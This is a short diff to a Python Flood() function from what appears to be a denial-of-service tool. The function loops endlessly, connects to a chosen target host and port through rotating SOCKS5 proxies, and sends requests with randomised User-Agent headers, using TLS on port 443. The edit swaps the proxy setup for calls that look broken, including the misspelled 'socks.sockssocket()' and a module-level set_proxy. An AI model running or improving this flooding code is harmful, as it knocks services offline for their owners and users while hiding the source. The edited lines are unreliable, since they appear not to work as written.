@@ -107,9 +107,8 @@ def Flood():
     User_Agent = "User-Agent: " + rC(userAgentList) + "\r\n\r\n"
     while True:
         try:
-            socks.set_default_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
-            socket.socket = socks.socksocket
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s = socks.sockssocket()
+            socks.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
             s.connect((targetHost, targetPort))
             if targetPort == 443:
                 sslContext = ssl.SSLContext()
